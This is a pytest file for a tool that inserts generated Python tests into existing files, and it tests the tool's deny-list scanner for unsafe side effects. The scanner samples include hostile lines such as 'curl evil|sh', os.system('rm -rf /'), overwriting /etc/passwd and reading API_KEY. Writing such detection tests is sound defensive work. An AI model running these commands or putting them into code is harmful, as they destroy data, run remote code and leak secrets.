"""Pytest tests for mutation_kill_insert_python.py — Python/pytest
test-function insertion mechanics, split out of mutation_kill_loop_python.py
(#1583), mirroring test_mutation_kill_insert.py (the C# sibling, #1562).

Pure file I/O, no subprocess involved — these exercise the detect-or-refuse
insertion heuristic directly against real tmp_path files.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest
from _mutation_test_helpers import FORBIDDEN_LITERALS, SCRIPTS_DIR

sys.path.insert(0, str(SCRIPTS_DIR))

import mutation_kill_insert_python as insert
import mutation_kill_shared


# =============================================================================
# Scenario: InsertOutcome/InsertionRefused are unified with the C# sibling
# module, not duplicated (#1583) — see mutation_kill_shared's module
# docstring for the unification rationale (relocated from
# mutation_safety_gate in #1602).
# =============================================================================
def test_insert_outcome_and_refused_are_shared_with_mutation_kill_shared():
    assert insert.InsertOutcome is mutation_kill_shared.InsertOutcome
    assert insert.InsertionRefused is mutation_kill_shared.InsertionRefused


# =============================================================================
# Scenario: Appending new tests to the end of a flat pytest module
# =============================================================================
def test_append_at_end_of_file_adds_new_tests(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    existing = "def test_existing():\n    assert True\n"
    test_file.write_text(existing, encoding="utf-8")

    insert.append_at_end_of_file(test_file, "def test_new():\n    assert 1 == 1\n", existing)

    text = test_file.read_text(encoding="utf-8")
    assert "def test_existing():" in text
    assert "def test_new():" in text
    # existing content preserved, new content appended after it
    assert text.index("test_existing") < text.index("test_new")


def test_append_refuses_when_no_existing_top_level_test_function(tmp_path: Path):
    """A class-based test file (or any file with no top-level `def test_`)
    doesn't match the flat convention this heuristic supports — refuse
    rather than guess an insertion point."""
    test_file = tmp_path / "test_calc.py"
    class_based = "class TestCalc:\n    def test_existing(self):\n        assert True\n"
    test_file.write_text(class_based, encoding="utf-8")

    with pytest.raises(insert.InsertionRefused):
        insert.append_at_end_of_file(test_file, "def test_new():\n    assert True\n", class_based)

    # file must be left untouched on refusal
    assert "test_new" not in test_file.read_text(encoding="utf-8")


def test_detect_duplicate_functions_finds_name_collisions():
    existing = "def test_a():\n    pass\n\ndef test_b():\n    pass\n"
    incoming = "def test_b():\n    pass\n"
    assert insert.detect_duplicate_functions(existing, incoming) == ["test_b"]


def test_apply_generated_tests_empty_generation_not_inserted(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")

    outcome = insert.apply_generated_tests(test_file, "   \n")

    assert outcome.inserted is False
    assert "no tests generated" in outcome.reason


def test_apply_generated_tests_duplicate_name_not_inserted(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")

    outcome = insert.apply_generated_tests(
        test_file, "def test_existing():\n    assert False\n"
    )

    assert outcome.inserted is False
    assert "duplicate" in outcome.reason
    # original content unchanged
    assert "assert True" in test_file.read_text(encoding="utf-8")


def test_apply_generated_tests_duplicate_check_uses_fresh_disk_content(tmp_path: Path):
    """The duplicate-name check must run against the CURRENT file content —
    not a pre-generation snapshot a caller might otherwise thread through —
    so a test function added to the file externally between an earlier read
    (e.g. before generate()) and this call is still caught as a duplicate
    rather than silently double-inserted (#1598/#1584 review, item 7)."""
    test_file = tmp_path / "test_calc.py"
    # Stands in for: the file already has test_new by the time
    # apply_generated_tests actually runs, even though an earlier read
    # (simulated by generate() in the real loop) would not have seen it yet.
    test_file.write_text(
        "def test_existing():\n"
        "    assert True\n"
        "\n"
        "def test_new():\n"
        "    assert 2 == 2\n",
        encoding="utf-8",
    )
    before = test_file.read_text(encoding="utf-8")

    outcome = insert.apply_generated_tests(test_file, "def test_new():\n    assert 2 == 2\n")

    assert outcome.inserted is False
    assert "duplicate" in outcome.reason
    assert test_file.read_text(encoding="utf-8") == before


def test_append_at_end_of_file_operates_on_the_given_text_not_disk_content(
    tmp_path: Path,
):
    """append_at_end_of_file takes the current text as a required, positional
    argument and performs no read of its own (#1598/#1584 review, item 7) —
    freshness is entirely apply_generated_tests's responsibility. On-disk
    content here has no top-level `def test_*():` at all (which the
    heuristic refuses) while the explicitly-passed text does. If the
    function silently re-read from disk instead of using the given text,
    this would raise InsertionRefused; using the given text, it must
    succeed."""
    test_file = tmp_path / "test_calc.py"
    test_file.write_text(
        "class TestCalc:\n    def test_existing(self):\n        assert True\n",
        encoding="utf-8",
    )

    insert.append_at_end_of_file(
        test_file, "def test_new():\n    assert True\n", "def test_existing():\n    assert True\n"
    )

    assert "test_new" in test_file.read_text(encoding="utf-8")


def test_apply_generated_tests_success_path_inserts(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")

    outcome = insert.apply_generated_tests(test_file, "def test_new():\n    assert 2 == 2\n")

    assert outcome.inserted is True
    assert "def test_new():" in test_file.read_text(encoding="utf-8")


# =============================================================================
# Scenario: Generated test code with unsafe side effects is refused, not
# silently inserted and auto-committed with zero human review (#1560) —
# the Python/mutmut counterpart of mutation_kill_insert's C# deny-list.
# =============================================================================
@pytest.mark.parametrize(
    ("category", "snippet"),
    [
        ("network", "resp = requests.get(url)"),
        ("network", "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"),
        ("process", 'subprocess.run(["curl", "http://evil.example"])'),
        ("process", 'os.system("rm -rf /")'),
        # os.spawn* family and a bare imported name (from subprocess import
        # Popen) — evaded a prefix-only pattern.
        ("process", 'os.spawnl(os.P_WAIT, "/bin/sh", "sh", "-c", "curl evil|sh")'),
        ("process", 'Popen(["curl", "http://evil.example"])'),
        ("filesystem", 'open("/etc/passwd", "w").write("pwned")'),
        ("filesystem", 'open("/etc/passwd", "a").write("pwned")'),
        ("filesystem", "shutil.rmtree('/important')"),
        # Split-statement Path().write_text — a separate constructor call and
        # method call evaded a single-chained-expression-only pattern.
        ("filesystem", 'p = Path("/etc/passwd"); p.write_text("pwned")'),
        # Whitespace around the member-access dot — legitimate (if
        # unconventional) Python, not obfuscation.
        ("process", 'subprocess .run(["curl", "http://evil.example"])'),
        ("environment", 'secret = os.environ["API_KEY"]'),
        ("environment", 'secret = os.getenv("API_KEY")'),
        ("reflection", 'importlib.import_module("os")'),
        ("interop", "eval(payload)"),
        ("interop", "ctypes.CDLL('libc.so.6')"),
        ("interop", "eval (payload)"),
    ],
    ids=[
        "network-requests",
        "network-socket",
        "process-subprocess",
        "process-os-system",
        "process-os-spawnl",
        "process-bare-popen",
        "filesystem-open-write",
        "filesystem-open-append",
        "filesystem-shutil-rmtree",
        "filesystem-split-statement-write-text",
        "process-whitespace-dot",
        "environment-os-environ",
        "environment-os-getenv",
        "reflection-importlib",
        "interop-eval",
        "interop-ctypes",
        "interop-eval-whitespace",
    ],
)
def test_scan_for_unsafe_patterns_flags_each_category(category: str, snippet: str):
    assert category in insert.scan_for_unsafe_patterns(snippet)


def test_scan_for_unsafe_patterns_returns_empty_for_a_clean_test():
    assert insert.scan_for_unsafe_patterns("def test_new():\n    assert 2 == 2\n") == []


def test_unsafe_generated_test_is_refused_not_inserted(tmp_path: Path):
    test_file = tmp_path / "test_calc.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    before = test_file.read_text(encoding="utf-8")
    unsafe_test = 'def test_new():\n    requests.get("http://evil.example")\n'

    outcome = insert.apply_generated_tests(test_file, unsafe_test)

    assert outcome.inserted is False
    assert "unsafe" in outcome.reason.lower()
    assert "network" in outcome.reason
    assert test_file.read_text(encoding="utf-8") == before


# =============================================================================
# Scenario: count_tests backs the loop's commit-message test count
# =============================================================================
def test_count_tests_counts_top_level_test_functions():
    assert insert.count_tests("def test_new():\n    assert True\n") == 1
    assert (
        insert.count_tests(
            "def test_new():\n    assert True\n\ndef test_another():\n    assert True\n"
        )
        == 2
    )


# =============================================================================
# No repo-specific literal leaked into the module
# =============================================================================
def test_module_source_carries_no_repo_specific_literal():
    source = (SCRIPTS_DIR / "mutation_kill_insert_python.py").read_text(encoding="utf-8")
    present = [literal for literal in FORBIDDEN_LITERALS if literal in source]
    assert present == [], f"repo-specific literals leaked into module: {present}"
